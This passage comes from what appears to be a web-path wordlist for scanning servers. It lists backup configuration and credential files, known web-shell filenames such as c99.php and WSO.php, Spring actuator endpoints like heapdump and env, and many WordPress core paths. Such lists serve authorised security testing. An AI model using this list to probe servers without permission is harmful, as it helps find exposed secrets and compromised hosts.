    "uploader/",
    "uploadfile.php",
    "uploadfiles.php",
    "uploadify.php",
    "uploadify/",
    "uploadify/uploadify.swf",
    "uploads.php",
    "uploads/",
    "upstream_conf",
    "ur-admin.php",
    "user",
    "user.php",
    "user.txt",
    "user_guide",
    "user_uploads",
    "useradmin",
    "useradmin/",
    "usercp2.php",
    "UserFile",
    "UserFiles",
    "usernames.txt",
    "users.csv",
    "users.db",
    "users.ini",
    "users.log",
    "users.mdb",
    "users.php",
    "users.sql",
    "users.sql.gz",
    "users.sqlite",
    "users.txt",
    "users.xls",
    "users/",
    "vagrant-spec.config.rb",
    "Vagrantfile",
    "validator.php",
    "var/backups/",
    "var/debug.log",
    "var/log/",
    "var/logs/",
    "vb.rar",
    "vb.sql",
    "vb.zip",
    "version",
    "VERSION.txt",
    "view.php",
    "vtund.conf",
    "wcx_ftp.ini",
    "web-console/",
    "web-console/Invoker",
    "web-console/ServerInfo.jsp",
    "WEB-INF./web.xml",
    "WEB-INF/config.xml",
    "WEB-INF/web.xml",
    "web.config",
    "web.config.bak",
    "web.config.bakup",
    "web.config.old",
    "web.config.temp",
    "web.config.tmp",
    "web.config.txt",
    "web.config::$DATA",
    "Web.Debug.config",
    "Web.Release.config",
    "web.Release.confiп",
    "web/phpMyAdmin/",
    "web/phpMyAdmin/scripts/setup.php",
    "web/scripts/setup.php",
    "webacula/application/config.ini",
    "webadmin",
    "webadmin.html",
    "webadmin.php",
    "webadmin/",
    "webdav/",
    "webdav/index.html",
    "webdav/servlet/webdav/",
    "webdb/",
    "webgrind",
    "webmail/",
    "webmail/src/configtest.php",
    "webmin/",
    "webpack.config.js",
    "webpack.config.node.js",
    "webservice/AutoComplete.amx",
    "website.git",
    "websql/",
    "webstat/",
    "webstats.html",
    "webstats/",
    "whmcs.php",
    "whmcs/downloads/dz.php",
    "wp-admin/c99.php",
    "wp-admin/setup-config.php",
    "wp-app.log",
    "wp-command.php",
    "wp-config.bak",
    "wp-config.dist",
    "wp-config.inc",
    "wp-config.old",
    "wp-config.php.bak",
    "wp-config.php.dist",
    "wp-config.php.inc",
    "wp-config.php.old",
    "wp-config.php.save",
    "wp-config.php.swp",
    "wp-config.php.templ",
    "wp-config.php.txt",
    "wp-config.php1",
    "wp-config.php2",
    "wp-config.php~",
    "wp-config.save",
    "wp-config.swp",
    "wp-config.txt",
    "wp-content/backup-db/",
    "wp-content/backups/",
    "wp-content/debug.log",
    "wp-content/plugins/akismet/admin.php",
    "wp-content/plugins/akismet/akismet.php",
    "wp-content/plugins/count-per-day/js/yc/d00.php",
    "wp-content/plugins/disqus-comment-system/disqus.php",
    "wp-content/plugins/google-sitemap-generator/sitemap-core.php",
    "wp-content/uploads/",
    "wp-json/wp/v2/users",
    "wp-register.php",
    "wp.php",
    "wp.rar/",
    "wp.sql",
    "wp.zip",
    "wp.zip/nwp-content/plugins/disqus-comment-system/disqus.php",
    "ws.php",
    "ws/api_test.php",
    "ws_ftp.ini",
    "WS_FTP.LOG",
    "WSO.php",
    "wso2.5.1.php",
    "wso2.php",
    "wso2_pack.php",
    "wvdial.conf",
    "wwwboard/passwd.txt",
    "wwwstats.htm",
    "x.php",
    "xampp/phpmyadmin/",
    "xampp/phpmyadmin/scripts/setup.php",
    "xd.php",
    "xls/",
    "xml/_common.xml",
    "xml/common.xml",
    "xmlrpc_server.php",
    "xphperrors.log",
    "xphpMyAdmin/",
    "xsl/",
    "xsl/_common.xsl",
    "xsl/common.xsl",
    "xsql/lib/XSQLConfig.xml",
    "zabbix/",
    "zebra.conf",
    "zehir.php",
    "zeroclipboard.swf",
    "zm_cms/spaw2/dialogs/dialog.php",
    "zone-h.php",
    "~install/",
    "actuator",
    "actuator/auditLog",
    "actuator/auditevents",
    "actuator/beans",
    "actuator/caches",
    "actuator/conditions",
    "actuator/configurationMetadata",
    "actuator/configprops",
    "actuator/dump",
    "actuator/env",
    "actuator/events",
    "actuator/exportRegisteredServices",
    "actuator/features",
    "actuator/flyway",
    "actuator/health",
    "actuator/healthcheck",
    "actuator/heapdump",
    "actuator/httptrace",
    "actuator/info",
    "actuator/integrationgraph",
    "actuator/jolokia",
    "actuator/mappings",
    "actuator/metrics",
    "actuator/logfile",
    "actuator/loggers",
    "actuator/loggingConfig",
    "actuator/liquibase",
    "actuator/refresh",
    "actuator/registeredServices",
    "actuator/releaseAttributes",
    "actuator/resolveAttributes",
    "actuator/scheduledtasks",
    "actuator/sessions",
    "actuator/springWebflow",
    "actuator/shutdown",
    "actuator/sso",
    "actuator/ssoSessions",
    "actuator/statistics",
    "actuator/status",
    "actuator/threaddump",
    "actuator/trace",
    "jolokia",
    "list",
    "wordpress",
    "wp-activate.php",
    "wp-includes/admin-bar.php",
    "wp-includes/revision.php",
    "wp-includes/template.php",
    "wp-includes/ms-functions.php",
    "wp-includes/class-wp-network-query.php",
    "wp-includes/class-feed.php",
    "wp-includes/class-wp-duotone.php",
    "wp-includes/widgets/class-wp-widget-links.php",
    "wp-includes/widgets/class-wp-widget-text.php",
    "wp-includes/widgets/class-wp-widget-media-image.php",
    "wp-includes/widgets/class-wp-widget-meta.php",
    "wp-includes/widgets/class-wp-widget-pages.php",
    "wp-includes/widgets/class-wp-widget-media-gallery.php",
    "wp-includes/widgets/class-wp-widget-media.php",
    "wp-includes/widgets/class-wp-widget-search.php",
    "wp-includes/widgets/class-wp-widget-calendar.php",
    "wp-includes/widgets/class-wp-widget-block.php",
    "wp-includes/widgets/class-wp-widget-media-audio.php",
    "wp-includes/widgets/class-wp-widget-tag-cloud.php",
    "wp-includes/widgets/class-wp-nav-menu-widget.php",
    "wp-includes/widgets/class-wp-widget-recent-posts.php",
    "wp-includes/widgets/class-wp-widget-recent-comments.php",
    "wp-includes/widgets/class-wp-widget-archives.php",
    "wp-includes/widgets/class-wp-widget-categories.php",
    "wp-includes/widgets/class-wp-widget-media-video.php",
    "wp-includes/widgets/class-wp-widget-rss.php",
    "wp-includes/widgets/class-wp-widget-custom-html.php",
    "wp-includes/shortcodes.php",
    "wp-includes/class-wp-block-parser-block.php",
    "wp-includes/locale.php",
    "wp-includes/feed-rss.php",
    "wp-includes/class-wp-block-editor-context.php",
    "wp-includes/class-wp-taxonomy.php",
    "wp-includes/class-wp-comment.php",
    "wp-includes/class-wp-recovery-mode-email-service.php",
    "wp-includes/class-wp-recovery-mode-key-service.php",
    "wp-includes/class-wp-theme-json-resolver.php",
    "wp-includes/script-loader.php",
    "wp-includes/certificates/ca-bundle.crt",
    "wp-includes/class-json.php",
    "wp-includes/sitemaps/class-wp-sitemaps-registry.php",
    "wp-includes/sitemaps/class-wp-sitemaps-index.php",
    "wp-includes/sitemaps/providers/class-wp-sitemaps-posts.php",
    "wp-includes/sitemaps/providers/class-wp-sitemaps-taxonomies.php",
    "wp-includes/sitemaps/providers/class-wp-sitemaps-users.php",
    "wp-includes/sitemaps/class-wp-sitemaps-stylesheet.php",
    "wp-includes/sitemaps/class-wp-sitemaps-provider.php",
    "wp-includes/sitemaps/class-wp-sitemaps-renderer.php",
    "wp-includes/sitemaps/class-wp-sitemaps.php",
    "wp-includes/functions.wp-scripts.php",
    "wp-includes/class-wp-image-editor-imagick.php",
    "wp-includes/class-avif-info.php",
    "wp-includes/class-wp-oembed-controller.php",
    "wp-includes/style-engine/class-wp-style-engine-css-declarations.php",
    "wp-includes/style-engine/class-wp-style-engine-css-rule.php",
    "wp-includes/style-engine/class-wp-style-engine.php",
    "wp-includes/style-engine/class-wp-style-engine-css-rules-store.php",
    "wp-includes/style-engine/class-wp-style-engine-processor.php",
    "wp-includes/customize/class-wp-customize-header-image-control.php",
    "wp-includes/customize/class-wp-customize-new-menu-section.php",
    "wp-includes/customize/class-wp-sidebar-block-editor-control.php",
    "wp-includes/customize/class-wp-customize-themes-section.php",
    "wp-includes/customize/class-wp-customize-partial.php",
    "wp-includes/customize/class-wp-customize-background-position-control.php",
    "wp-includes/customize/class-wp-widget-form-customize-control.php",
    "wp-includes/customize/class-wp-customize-filter-setting.php",
    "wp-includes/customize/class-wp-customize-media-control.php",
    "wp-includes/customize/class-wp-customize-background-image-setting.php",
    "wp-includes/customize/class-wp-customize-header-image-setting.php",
    "wp-includes/customize/class-wp-customize-color-control.php",
    "wp-includes/customize/class-wp-customize-nav-menu-item-setting.php",
    "wp-includes/customize/class-wp-customize-sidebar-section.php",
    "wp-includes/customize/class-wp-customize-selective-refresh.php",
    "wp-includes/customize/class-wp-customize-cropped-image-control.php",
    "wp-includes/customize/class-wp-customize-nav-menu-locations-control.php",
    "wp-includes/customize/class-wp-customize-date-time-control.php",
    "wp-includes/customize/class-wp-customize-code-editor-control.php",
    "wp-includes/customize/class-wp-widget-area-customize-control.php",
    "wp-includes/customize/class-wp-customize-nav-menus-panel.php",
    "wp-includes/customize/class-wp-customize-background-image-control.php",
    "wp-includes/customize/class-wp-customize-site-icon-control.php",
    "wp-includes/customize/class-wp-customize-nav-menu-section.php",
    "wp-includes/customize/class-wp-customize-theme-control.php",
    "wp-includes/customize/class-wp-customize-new-menu-control.php",
    "wp-includes/customize/class-wp-customize-custom-css-setting.php",
    "wp-includes/customize/class-wp-customize-nav-menu-name-control.php",
    "wp-includes/customize/class-wp-customize-themes-panel.php",
    "wp-includes/customize/class-wp-customize-image-control.php",
    "wp-includes/customize/class-wp-customize-upload-control.php",
    "wp-includes/customize/class-wp-customize-nav-menu-item-control.php",
    "wp-includes/customize/class-wp-customize-nav-menu-location-control.php",
    "wp-includes/customize/class-wp-customize-nav-menu-setting.php",
    "wp-includes/customize/class-wp-customize-nav-menu-control.php",
    "wp-includes/customize/class-wp-customize-nav-menu-auto-add-control.php",
    "wp-includes/kses.php",
    "wp-includes/class-wp-locale-switcher.php",
    "wp-includes/class-wp-block-templates-registry.php",
    "wp-includes/class-wp-recovery-mode-cookie-service.php",
    "wp-includes/interactivity-api/class-wp-interactivity-api-directives-processor.php",
    "wp-includes/interactivity-api/class-wp-interactivity-api.php",
    "wp-includes/interactivity-api/interactivity-api.php",
    "wp-includes/class-wp-xmlrpc-server.php",
    "wp-includes/ms-settings.php",
    "wp-includes/block-template-utils.php",
    "wp-includes/class-wp-customize-control.php",
    "wp-includes/l10n.php",
    "wp-includes/bookmark.php",
    "wp-includes/fonts.php",
    "wp-includes/ms-default-filters.php",
    "wp-includes/class-wp-customize-section.php",
    "wp-includes/block-patterns/query-grid-posts.php",
    "wp-includes/block-patterns/query-offset-posts.php",
    "wp-includes/block-patterns/query-medium-posts.php",
    "wp-includes/block-patterns/query-standard-posts.php",
    "wp-includes/block-patterns/query-large-title-posts.php",
    "wp-includes/block-patterns/query-small-posts.php",
    "wp-includes/block-patterns/social-links-shared-background-color.php",
    "wp-includes/atomlib.php",
    "wp-includes/class-wp-script-modules.php",
    "wp-includes/class-wp-http-streams.php",
    "wp-includes/assets/script-loader-react-refresh-entry.php",
    "wp-includes/assets/script-modules-packages.min.php",
    "wp-includes/assets/script-loader-react-refresh-runtime.php",
    "wp-includes/assets/script-loader-packages.php",
    "wp-includes/assets/script-loader-packages.min.php",
    "wp-includes/assets/script-loader-react-refresh-runtime.min.php",
    "wp-includes/assets/script-modules-packages.php",
    "wp-includes/assets/script-loader-react-refresh-entry.min.php",
    "wp-includes/class-wp-date-query.php",
    "wp-includes/script-modules.php",
    "wp-includes/cron.php",
    "wp-includes/class-wp-embed.php",
    "wp-includes/vars.php",
    "wp-includes/feed-rss2.php",
    "wp-includes/class-wp-block-type-registry.php",
    "wp-includes/class-wp-user.php",
    "wp-includes/class.wp-dependencies.php",
    "wp-includes/ms-files.php",
    "wp-includes/class-snoopy.php",
    "wp-includes/class-wp-block.php",
    "wp-includes/class-wp-image-editor.php",
    "wp-includes/class-phpass.php",
    "wp-includes/http.php",
    "wp-includes/rss-functions.php",
    "wp-includes/class-wp-roles.php",
    "wp-includes/Requests/src/Port.php",
    "wp-includes/Requests/src/HookManager.php",
    "wp-includes/Requests/src/Response/Headers.php",
    "wp-includes/Requests/src/Iri.php",
    "wp-includes/Requests/src/Cookie.php",
    "wp-includes/Requests/src/Capability.php",
    "wp-includes/Requests/src/Proxy.php",
    "wp-includes/Requests/src/Hooks.php",
    "wp-includes/Requests/src/Auth/Basic.php",
    "wp-includes/Requests/src/Ssl.php",
    "wp-includes/Requests/src/Response.php",
    "wp-includes/Requests/src/Cookie/Jar.php",
    "wp-includes/Requests/src/Exception/Http.php",
    "wp-includes/Requests/src/Exception/InvalidArgument.php",
    "wp-includes/Requests/src/Exception/Transport.php",
    "wp-includes/Requests/src/Exception/Transport/Curl.php",
    "wp-includes/Requests/src/Exception/Http/Status304.php",
    "wp-includes/Requests/src/Exception/Http/Status418.php",
    "wp-includes/Requests/src/Exception/Http/Status417.php",
    "wp-includes/Requests/src/Exception/Http/Status409.php",
    "wp-includes/Requests/src/Exception/Http/Status429.php",
    "wp-includes/Requests/src/Exception/Http/Status501.php",
    "wp-includes/Requests/src/Exception/Http/Status408.php",
    "wp-includes/Requests/src/Exception/Http/Status407.php",
    "wp-includes/Requests/src/Exception/Http/Status400.php",
    "wp-includes/Requests/src/Exception/Http/Status306.php",
    "wp-includes/Requests/src/Exception/Http/Status412.php",
    "wp-includes/Requests/src/Exception/Http/Status502.php",
    "wp-includes/Requests/src/Exception/Http/Status411.php",
    "wp-includes/Requests/src/Exception/Http/StatusUnknown.php",
    "wp-includes/Requests/src/Exception/Http/Status500.php",
    "wp-includes/Requests/src/Exception/Http/Status415.php",
    "wp-includes/Requests/src/Exception/Http/Status406.php",
    "wp-includes/Requests/src/Exception/Http/Status403.php",
    "wp-includes/Requests/src/Exception/Http/Status401.php",
    "wp-includes/Requests/src/Exception/Http/Status404.php",
    "wp-includes/Requests/src/Exception/Http/Status428.php",
    "wp-includes/Requests/src/Exception/Http/Status305.php",
    "wp-includes/Requests/src/Exception/Http/Status402.php",
    "wp-includes/Requests/src/Exception/Http/Status503.php",
    "wp-includes/Requests/src/Exception/Http/Status414.php",
    "wp-includes/Requests/src/Exception/Http/Status431.php",
    "wp-includes/Requests/src/Exception/Http/Status413.php",
    "wp-includes/Requests/src/Exception/Http/Status505.php",
    "wp-includes/Requests/src/Exception/Http/Status511.php",
    "wp-includes/Requests/src/Exception/Http/Status410.php",
    "wp-includes/Requests/src/Exception/Http/Status416.php",
    "wp-includes/Requests/src/Exception/Http/Status504.php",
    "wp-includes/Requests/src/Exception/Http/Status405.php",
    "wp-includes/Requests/src/Exception/ArgumentCount.php",
    "wp-includes/Requests/src/Auth.php",
    "wp-includes/Requests/src/Transport.php",
    "wp-includes/Requests/src/Transport/Curl.php",
    "wp-includes/Requests/src/Transport/Fsockopen.php",
    "wp-includes/Requests/src/Proxy/Http.php",
    "wp-includes/Requests/src/Ipv6.php",
    "wp-includes/Requests/src/Requests.php",
    "wp-includes/Requests/src/Utility/FilteredIterator.php",
    "wp-includes/Requests/src/Utility/InputValidator.php",
    "wp-includes/Requests/src/Utility/CaseInsensitiveDictionary.php",
    "wp-includes/Requests/src/Session.php",
    "wp-includes/Requests/src/Exception.php",
    "wp-includes/Requests/src/IdnaEncoder.php",
    "wp-includes/Requests/src/Autoload.php",
    "wp-includes/Requests/library/Requests.php",
    "wp-includes/class-wp-http-proxy.php",
    "wp-includes/class-smtp.php",
    "wp-includes/class-wp-customize-panel.php",
    "wp-includes/comment-template.php",
    "wp-includes/rest-api/search/class-wp-rest-post-search-handler.php",
    "wp-includes/rest-api/search/class-wp-rest-post-format-search-handler.php",
    "wp-includes/rest-api/search/class-wp-rest-search-handler.php",
    "wp-includes/rest-api/search/class-wp-rest-term-search-handler.php",
    "wp-includes/rest-api/class-wp-rest-server.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-themes-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-terms-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-block-types-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-url-details-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-menus-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-widget-types-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-plugins-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-pattern-directory-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-menu-locations-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-navigation-fallback-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-global-styles-revisions-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-block-pattern-categories-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-font-families-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-global-styles-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-template-autosaves-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-site-health-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-settings-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-templates-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-edit-site-export-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-block-patterns-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-blocks-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-block-renderer-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-template-revisions-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-application-passwords-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-post-types-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-taxonomies-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-search-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-font-faces-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-menu-items-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-font-collections-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-sidebars-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-block-directory-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-widgets-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-revisions-controller.php",
    "wp-includes/rest-api/endpoints/class-wp-rest-autosaves-controller.php",
    "wp-includes/rest-api/class-wp-rest-response.php",
    "wp-includes/rest-api/fields/class-wp-rest-comment-meta-fields.php",
    "wp-includes/rest-api/fields/class-wp-rest-user-meta-fields.php",
    "wp-includes/rest-api/fields/class-wp-rest-post-meta-fields.php",
    "wp-includes/rest-api/fields/class-wp-rest-term-meta-fields.php",
    "wp-includes/rest-api/fields/class-wp-rest-meta-fields.php",
    "wp-includes/rest-api/class-wp-rest-request.php",
    "wp-includes/class-wp-block-bindings-source.php",
    "wp-includes/class-wp-theme.php",
    "wp-includes/class-wp-http-response.php",
    "wp-includes/class-wp-http.php",
    "wp-includes/update.php",
    "wp-includes/class-wp-query.php",
    "wp-includes/class-wp-widget-factory.php",
    "wp-includes/class-wp-block-pattern-categories-registry.php",
    "wp-includes/ID3/module.tag.apetag.php",
    "wp-includes/ID3/readme.txt",
    "wp-includes/ID3/module.audio-video.riff.php",
    "wp-includes/ID3/module.tag.lyrics3.php",
    "wp-includes/ID3/module.audio.ogg.php",
    "wp-includes/ID3/module.audio.dts.php",
    "wp-includes/ID3/module.tag.id3v1.php",
    "wp-includes/ID3/license.txt",
    "wp-includes/ID3/module.audio.ac3.php",
    "wp-includes/ID3/module.audio.flac.php",
    "wp-includes/ID3/module.audio-video.flv.php",
    "wp-includes/ID3/getid3.lib.php",
    "wp-includes/ID3/module.audio.mp3.php",
    "wp-includes/ID3/module.audio-video.asf.php",
    "wp-includes/ID3/getid3.php",
    "wp-includes/ID3/module.audio-video.matroska.php",
    "wp-includes/ID3/module.tag.id3v2.php",
    "wp-includes/ID3/module.audio-video.quicktime.php",
    "wp-includes/default-filters.php",
    "wp-includes/global-styles-and-settings.php",
    "wp-includes/ms-network.php",
    "wp-includes/class-wp-user-request.php",
    "wp-includes/plugin.php",
    "wp-includes/blocks.php",
    "wp-includes/sitemaps.php",
    "wp-includes/block-template.php",
    "wp-includes/class-wp-user-query.php",
    "wp-includes/meta.php",
    "wp-includes/template-canvas.php",
    "wp-includes/class-wp-dependency.php",
    "wp-includes/images/media/interactive.svg",
    "wp-includes/images/media/code.svg",
    "wp-includes/images/media/video.svg",
    "wp-includes/images/media/archive.svg",
    "wp-includes/images/media/audio.svg",
    "wp-includes/images/media/document.svg",
    "wp-includes/images/media/default.svg",
    "wp-includes/images/media/spreadsheet.svg",
    "wp-includes/images/media/text.svg",
    "wp-includes/images/crystal/license.txt",
    "wp-includes/class-wp-http-cookie.php",
    "wp-includes/author-template.php",
    "wp-includes/class-wp-token-map.php",
    "wp-includes/class-wp-fatal-error-handler.php",
    "wp-includes/robots-template.php",
    "wp-includes/wp-diff.php",
    "wp-includes/media-template.php",
    "wp-includes/feed-rdf.php",
    "wp-includes/user.php",
    "wp-includes/registration-functions.php",
    "wp-includes/class-wp-http-encoding.php",
    "wp-includes/wp-db.php",
    "wp-includes/feed.php",
    "wp-includes/feed-atom.php",
    "wp-includes/class-requests.php",
    "wp-includes/default-constants.php",
    "wp-includes/class-wp-block-template.php",
    "wp-includes/class-walker-page-dropdown.php",
    "wp-includes/feed-rss2-comments.php",
    "wp-includes/class-wp-hook.php",
    "wp-includes/class-wp-http-requests-hooks.php",
    "wp-includes/formatting.php",
    "wp-includes/functions.php",
    "wp-includes/class-http.php",
    "wp-includes/query.php",
    "wp-includes/class-wp-textdomain-registry.php",
    "wp-includes/compat.php",
    "wp-includes/ms-deprecated.php",
    "wp-includes/class-wp-feed-cache-transient.php",
    "wp-includes/embed.php",
    "wp-includes/html-api/class-wp-html-processor-state.php",
    "wp-includes/html-api/class-wp-html-doctype-info.php",
    "wp-includes/html-api/class-wp-html-open-elements.php",
    "wp-includes/html-api/class-wp-html-stack-event.php",
    "wp-includes/html-api/class-wp-html-tag-processor.php",
    "wp-includes/html-api/class-wp-html-span.php",
    "wp-includes/html-api/html5-named-character-references.php",
    "wp-includes/html-api/class-wp-html-text-replacement.php",
    "wp-includes/html-api/class-wp-html-processor.php",
    "wp-includes/html-api/class-wp-html-attribute-token.php",
    "wp-includes/html-api/class-wp-html-decoder.php",
    "wp-includes/html-api/class-wp-html-active-formatting-elements.php",
    "wp-includes/html-api/class-wp-html-unsupported-exception.php",
    "wp-includes/html-api/class-wp-html-token.php",
    "wp-includes/ms-site.php",
    "wp-includes/class-wp-session-tokens.php",
    "wp-includes/js/wplink.js",
    "wp-includes/js/wp-util.min.js",
    "wp-includes/js/shortcode.min.js",
    "wp-includes/js/swfupload/license.txt",
    "wp-includes/js/swfupload/handlers.js",
    "wp-includes/js/swfupload/handlers.min.js",
    "wp-includes/js/swfupload/swfupload.js",
    "wp-includes/js/mediaelement/renderers/vimeo.min.js",
    "wp-includes/js/mediaelement/renderers/vimeo.js",
    "wp-includes/js/mediaelement/mediaelement-migrate.min.js",
    "wp-includes/js/mediaelement/mediaelement-migrate.js",
    "wp-includes/js/mediaelement/wp-mediaelement.min.js",
    "wp-includes/js/mediaelement/mediaelement-and-player.js",
    "wp-includes/js/mediaelement/mediaelement.min.js",
    "wp-includes/js/mediaelement/wp-mediaelement.js",
    "wp-includes/js/mediaelement/wp-playlist.min.js",
    "wp-includes/js/mediaelement/mediaelement-and-player.min.js",
    "wp-includes/js/mediaelement/mejs-controls.svg",
    "wp-includes/js/mediaelement/wp-playlist.js",
    "wp-includes/js/mediaelement/mediaelement.js",
    "wp-includes/js/masonry.min.js",
    "wp-includes/js/wp-emoji.js",
    "wp-includes/js/media-editor.js",
    "wp-includes/js/customize-selective-refresh.js",
    "wp-includes/js/customize-preview-widgets.min.js",
    "wp-includes/js/customize-views.min.js",
    "wp-includes/js/wp-embed-template.js",
    "wp-includes/js/twemoji.js",
    "wp-includes/js/customize-base.js",
    "wp-includes/js/admin-bar.js",
    "wp-includes/js/media-grid.js",
    "wp-includes/js/swfobject.js",
    "wp-includes/js/customize-models.min.js",
    "wp-includes/js/wp-sanitize.js",
    "wp-includes/js/media-views.min.js",
    "wp-includes/js/mce-view.min.js",
    "wp-includes/js/shortcode.js",
    "wp-includes/js/autosave.js",
    "wp-includes/js/wp-api.min.js",
    "wp-includes/js/media-views.js",
    "wp-includes/js/wp-util.js",
    "wp-includes/js/media-models.js",
    "wp-includes/js/customize-base.min.js",
    "wp-includes/js/comment-reply.js",
    "wp-includes/js/customize-preview-nav-menus.min.js",
    "wp-includes/js/wpdialog.js",
    "wp-includes/js/wp-custom-header.js",
    "wp-includes/js/wp-ajax-response.js",
    "wp-includes/js/wp-embed.min.js",
    "wp-includes/js/heartbeat.js",
    "wp-includes/js/hoverintent-js.min.js",
    "wp-includes/js/zxcvbn.min.js",
    "wp-includes/js/twemoji.min.js",
    "wp-includes/js/quicktags.js",
    "wp-includes/js/hoverIntent.min.js",
    "wp-includes/js/utils.min.js",
    "wp-includes/js/jcrop/jquery.Jcrop.min.js",
    "wp-includes/js/customize-views.js",
    "wp-includes/js/media-models.min.js",
    "wp-includes/js/zxcvbn-async.min.js",
    "wp-includes/js/media-grid.min.js",
    "wp-includes/js/plupload/wp-plupload.js",
    "wp-includes/js/plupload/plupload.min.js",
    "wp-includes/js/plupload/license.txt",
    "wp-includes/js/plupload/moxie.js",
    "wp-includes/js/plupload/wp-plupload.min.js",
    "wp-includes/js/plupload/handlers.js",
    "wp-includes/js/plupload/plupload.js",
    "wp-includes/js/plupload/handlers.min.js",
    "wp-includes/js/plupload/moxie.min.js",
    "wp-includes/js/backbone.min.js",
    "wp-includes/js/thickbox/thickbox.js",
    "wp-includes/js/quicktags.min.js",
    "wp-includes/js/wpdialog.min.js",
    "wp-includes/js/codemirror/esprima.js",
    "wp-includes/js/codemirror/jsonlint.js",
    "wp-includes/js/codemirror/fakejshint.js",
    "wp-includes/js/codemirror/codemirror.min.js",
    "wp-includes/js/codemirror/htmlhint-kses.js",
    "wp-includes/js/codemirror/htmlhint.js",
    "wp-includes/js/codemirror/csslint.js",
    "wp-includes/js/customize-loader.min.js",
    "wp-includes/js/json2.js",
    "wp-includes/js/comment-reply.min.js",
    "wp-includes/js/underscore.js",
    "wp-includes/js/wp-pointer.js",
    "wp-includes/js/wp-api.js",
    "wp-includes/js/wp-pointer.min.js",
    "wp-includes/js/imagesloaded.min.js",
    "wp-includes/js/wp-backbone.js",
    "wp-includes/js/underscore.min.js",
    "wp-includes/js/clipboard.js",
    "wp-includes/js/autosave.min.js",
    "wp-includes/js/clipboard.min.js",
    "wp-includes/js/wp-auth-check.min.js",
    "wp-includes/js/heartbeat.min.js",
    "wp-includes/js/api-request.min.js",
    "wp-includes/js/wp-list-revisions.js",
    "wp-includes/js/api-request.js",
    "wp-includes/js/media-editor.min.js",
    "wp-includes/js/mce-view.js",
    "wp-includes/js/wp-sanitize.min.js",
    "wp-includes/js/jquery/ui/effect-transfer.min.js",
    "wp-includes/js/jquery/ui/effect-drop.js",
    "wp-includes/js/jquery/ui/tooltip.min.js",
    "wp-includes/js/jquery/ui/selectable.min.js",
    "wp-includes/js/jquery/ui/spinner.min.js",
    "wp-includes/js/jquery/ui/effect-fold.min.js",
    "wp-includes/js/jquery/ui/accordion.js",
    "wp-includes/js/jquery/ui/effect-pulsate.js",
    "wp-includes/js/jquery/ui/tooltip.js",
    "wp-includes/js/jquery/ui/effect-highlight.js",
    "wp-includes/js/jquery/ui/effect.min.js",
    "wp-includes/js/jquery/ui/checkboxradio.js",
    "wp-includes/js/jquery/ui/checkboxradio.min.js",
    "wp-includes/js/jquery/ui/effect-puff.js",
    "wp-includes/js/jquery/ui/effect-transfer.js",
    "wp-includes/js/jquery/ui/autocomplete.min.js",
    "wp-includes/js/jquery/ui/controlgroup.min.js",
    "wp-includes/js/jquery/ui/effect-bounce.js",
    "wp-includes/js/jquery/ui/mouse.min.js",
    "wp-includes/js/jquery/ui/effect-pulsate.min.js",
    "wp-includes/js/jquery/ui/sortable.js",
    "wp-includes/js/jquery/ui/dialog.min.js",
    "wp-includes/js/jquery/ui/menu.min.js",
    "wp-includes/js/jquery/ui/button.js",
    "wp-includes/js/jquery/ui/effect-highlight.min.js",
    "wp-includes/js/jquery/ui/draggable.min.js",
    "wp-includes/js/jquery/ui/effect-size.min.js",
    "wp-includes/js/jquery/ui/selectmenu.min.js",
    "wp-includes/js/jquery/ui/effect-explode.min.js",
    "wp-includes/js/jquery/ui/slider.js",
    "wp-includes/js/jquery/ui/effect-explode.js",
    "wp-includes/js/jquery/ui/resizable.js",
    "wp-includes/js/jquery/ui/progressbar.min.js",
    "wp-includes/js/jquery/ui/effect-shake.js",
    "wp-includes/js/jquery/ui/sortable.min.js",
    "wp-includes/js/jquery/ui/effect-bounce.min.js",
    "wp-includes/js/jquery/ui/effect-clip.js",
    "wp-includes/js/jquery/ui/dialog.js",
    "wp-includes/js/jquery/ui/accordion.min.js",
    "wp-includes/js/jquery/ui/button.min.js",
    "wp-includes/js/jquery/ui/effect-fade.js",
    "wp-includes/js/jquery/ui/menu.js",
    "wp-includes/js/jquery/ui/tabs.min.js",
    "wp-includes/js/jquery/ui/core.js",
    "wp-includes/js/jquery/ui/datepicker.js",
    "wp-includes/js/jquery/ui/effect-slide.js",
